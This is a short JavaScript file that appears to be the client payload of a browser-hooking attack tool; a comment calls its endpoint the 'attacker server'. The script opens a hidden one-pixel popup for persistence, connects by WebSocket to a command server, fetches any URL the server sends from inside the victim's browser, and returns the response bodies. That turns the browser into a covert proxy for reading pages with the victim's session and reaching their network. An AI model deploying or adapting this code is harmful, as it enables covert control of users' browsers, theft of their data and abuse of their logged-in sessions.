(() => {
    // TODO implement more persistence

    const popupenabled = true // TODO do this better (e.g. put in config)
    let popup;
    if(popupenabled) {
        setTimeout(()=>{
            popup = window.open(window.location.href, null, 'width=1,height=1,left=0,top=0')
        }, 1)
    }

    (() => {
        // TODO build file using a config containing the attacker server
        const id = Math.floor(Math.random() * (2 ** 16))
        const ws_url = 'ws://localhost:8080/ws/' + id
        const ws = new WebSocket(ws_url)

        ws.onmessage = (msg) => {
            const msgobj = JSON.parse(msg.data)
            const url = msgobj.url
            // TODO make a request object to allow for more configurable requests
            fetch(url)
            .then(res => {
                res.text()
                .then(restext => {
                    ws.send(JSON.stringify(restext))
                })
                .catch(err => ws.send(err))
            })
            .catch(err => ws.send(err))
        }
    })()
})()
